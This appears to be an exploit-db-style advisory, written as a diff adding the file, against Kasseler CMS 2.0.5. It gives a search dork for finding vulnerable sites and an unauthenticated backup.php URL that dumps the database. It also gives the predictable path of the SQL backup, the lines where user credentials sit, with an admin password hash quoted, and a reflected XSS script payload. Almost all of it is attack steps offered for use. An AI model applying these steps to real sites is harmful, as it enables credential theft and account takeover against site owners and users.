@@ -1,0 +1,36 @@
+========================================================================================                  
+| # Title    : kasseler cms 2.0.5 => by Pass / Download Backup Vulnerability   
+| # Author   : indoushka                                                               
+| # email    : indoushka@hotmail.com                                                                                                                                                                    
+| # Dork     : Copyright ©2007-2009 by Kasseler CMS. All rights reserved.                                                                                                                
+| # Tested on: windows SP2 Français V.(Pnx2 2.0)        
+| # Bug      : Backup     
+                                                            
+======================      Exploit By indoushka       =================================
+# Exploit  :  
+
+1 - http://127.0.0.1/kasseler/backup.php
+
+File size: 37.38 KB
+Tables processed: 39
+Rows processed: 37
+
+2 - http://127.0.0.1/uploads/backup/auto_2010-04-27_14-29.sql
+
+in lig 645:668 col 1 you found the login information
+
+INSERT INTO `kasseler_users` VALUES
+(-1, 'guest', 'Guest', '', '', 'default.png', '0000-00-00 00:00:00', 'default', 0, '', '', '', '', '', 5, '', '0', '', '0000-00-00 00:00:00', '', '', '0000-00-00', 0, '', '', '', '', '', '', 0, -1, 0, 0, 0, 0, 0, 0, '', 0, 'MBzx97cQMjKQ47tJgil9PBQDr', 1, 0, 0, '0.00', 0, 1, NULL),
+(1, 'admin', 'admin', 'admin@127.0.0.1', 'http://127.0.0.1/', 'admin.png', '2010-04-27 11:25:22', 'default', 2, NULL, NULL, NULL, NULL, 'd0970714757783e6cf17b26fb8e2298f', 1, NULL, '0.0.0.0', 'N/A', '0000-00-00 00:00:00', 'N/A', 'N/A', '0000-00-00', 0, NULL, NULL, NULL, NULL, NULL, NULL, 0, 0, 0, 0, 0, 0, 0, 0, NULL, 0, NULL, 1, 0, 0, '0.00', 0, 1, NULL);
+
+3 - XSS :
+
+http://127.0.0.1/index.php?online/<script>alert(213771818860)</script>
+
+Dz-Ghost Team ===== Saoucha * Star08 * Redda * theblind74 * XproratiX * onurozkan * n2n * Meher Assel ====================
+Greetz : Exploit-db Team 
+all my friend :
+His0k4 * Hussin-X * Rafik (www.Tinjah.com) * Yashar (www.sc0rpion.ir) SoldierOfAllah (www.m4r0c-s3curity.cc)
+Stake (www.v4-team.com) * r1z (www.sec-r1z.com) * D4NB4R http://www.ilegalintrusion.net/foro/
+www.sa-hacker.com *  www.alkrsan.net * www.mormoroth.net * MR.SoOoFe * ThE g0bL!N
+------------------------------------------------------------------------------------------------------------------------
